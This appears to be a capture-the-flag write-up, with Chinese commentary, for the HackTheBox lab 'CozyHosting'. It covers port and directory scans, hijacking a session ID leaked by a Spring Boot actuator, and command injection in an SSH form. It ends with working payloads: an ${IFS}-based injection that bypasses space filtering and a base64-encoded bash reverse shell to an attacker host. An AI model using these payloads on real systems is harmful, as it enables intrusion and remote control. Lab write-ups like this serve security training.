```
┌──(root㉿kali)-[~]
└─# nmap -p- --open -Pn 10.10.11.230
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-06 01:41 EST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.33s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8282/tcp open  libelle
9191/tcp open  sun-as-jpda

Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds

```


```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A -O  10.10.11.230 -p 22,80,8282,9191
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-06 01:44 EST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.50s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
8282/tcp open  tcpwrapped
9191/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   553.49 ms 10.10.16.1
2   255.27 ms cozyhosting.htb (10.10.11.230)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.33 seconds

```


```
┌──(root㉿kali)-[~]
└─# python3 /root/dirsearch/dirsearch.py -u http://cozyhosting.htb/
/root/dirsearch/thirdparty/requests/__init__.py:88: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (5.1.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                        
 (_||| _) (/_(_|| (_| )                                                                                                                                 
                                                                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: /root/dirsearch/reports/cozyhosting.htb/-_24-02-06_01-50-54.txt

Error Log: /root/dirsearch/logs/errors-24-02-06_01-50-54.log

Target: http://cozyhosting.htb/

[01:50:55] Starting: 
[01:51:01] 400 -  166B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[01:51:19] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[01:51:26] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[01:51:28] 400 -  435B  - /a%5c.aspx                                        
[01:51:30] 200 -  634B  - /actuator                                         
[01:51:30] 200 -    5KB - /actuator/env                                     
[01:51:30] 200 -   15B  - /actuator/health                                  
[01:51:30] 200 -   10KB - /actuator/mappings                                
[01:51:31] 200 -   48B  - /actuator/sessions                                
[01:51:31] 200 -  124KB - /actuator/beans                                   
[01:51:32] 401 -   97B  - /admin                                            
[01:51:58] 400 -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[01:52:10] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
[01:52:10] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
[01:52:11] 500 -   73B  - /error                                            
[01:52:11] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[01:52:12] 200 -    0B  - /extjs/resources//charts.swf                      
[01:52:18] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
[01:52:20] 200 -   12KB - /index                                            
[01:52:27] 200 -    4KB - /login                                            
[01:52:27] 200 -    0B  - /login.wdm%2e                                     
[01:52:29] 204 -    0B  - /logout                                           
[01:52:52] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF                       
                                                                             
Task Completed  
```


打开/actuator/mappings：
```
	
contexts	
application	
mappings	
dispatcherServlets	
dispatcherServlet	
0	
handler	"Actuator web endpoint 'beans'"
predicate	"{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
1	
handler	"Actuator web endpoint 'health-path'"
predicate	"{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
2	
handler	"Actuator web endpoint 'mappings'"
predicate	"{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
3	
handler	"Actuator root web endpoint"
predicate	"{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
4	
handler	"Actuator web endpoint 'env'"
predicate	"{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
5	
handler	"Actuator web endpoint 'env-toMatch'"
predicate	"{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
6	
handler	"Actuator web endpoint 'sessions'"
predicate	"{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
7	
handler	"Actuator web endpoint 'health'"
predicate	"{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
8	
handler	"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)"
predicate	"{ [/error], produces [text/html]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
9	
handler	"htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)"
predicate	"{POST [/executessh]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
10	
handler	"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)"
predicate	"{ [/error]}"
details	
handlerMethod	{…}
requestMappingConditions	{…}
11	
handler	"ParameterizableViewController [view=\"admin\"]"
predicate	"/admin"
12	
handler	"ParameterizableViewController [view=\"addhost\"]"
predicate	"/addhost"
13	
handler	"ParameterizableViewController [view=\"index\"]"
predicate	"/index"
14	
handler	"ParameterizableViewController [view=\"login\"]"
predicate	"/login"
15	
handler	"ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]"
predicate	"/webjars/**"
16	
handler	"ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]"
predicate	"/**"
servletFilters	
0	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"requestContextFilter"
className	"org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter"
1	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"Tomcat WebSocket (JSR356) Filter"
className	"org.apache.tomcat.websocket.server.WsFilter"
2	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"serverHttpObservationFilter"
className	"org.springframework.web.filter.ServerHttpObservationFilter"
3	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"characterEncodingFilter"
className	"org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter"
4	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"springSecurityFilterChain"
className	"org.springframework.boot.web.servlet.DelegatingFilterProxyRegistrationBean$1"
5	
servletNameMappings	[]
urlPatternMappings	
0	"/*"
name	"formContentFilter"
className	"org.springframework.boot.web.servlet.filter.OrderedFormContentFilter"
servlets	
0	
mappings	
0	"/"
name	"dispatcherServlet"
className	"org.springframework.web.servlet.DispatcherServlet"
```


打开http://cozyhosting.htb/actuator/sessions

显示：
1B2DF0FCFC642D6F43ED9693026F9E92	"kanderson"

在/admin修改JSESSIONID的值为：1B2DF0FCFC642D6F43ED9693026F9E92

可以登录/admin


在Connection settings栏填写host和username，burp抓包
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=1B2DF0FCFC642D6F43ED9693026F9E92
Upgrade-Insecure-Requests: 1

host=127.0.0.1&username=kanderson
```

命令注入。
使用${IFS}分隔符可以绕过命令注入里的空格，执行任意系统命令

下面命令返回ping包
```
host=127.0.0.1&username=kanderson;ping${IFS}-c4${IFS}10.10.16.2;#
```

加密shell命令：

```
┌──(root㉿max)-[~]
└─# echo "bash -i >& /dev/tcp/10.10.16.2/443 0>&1" | base64 -w 0 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxCg==  
```

rev shell paylao

```
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```


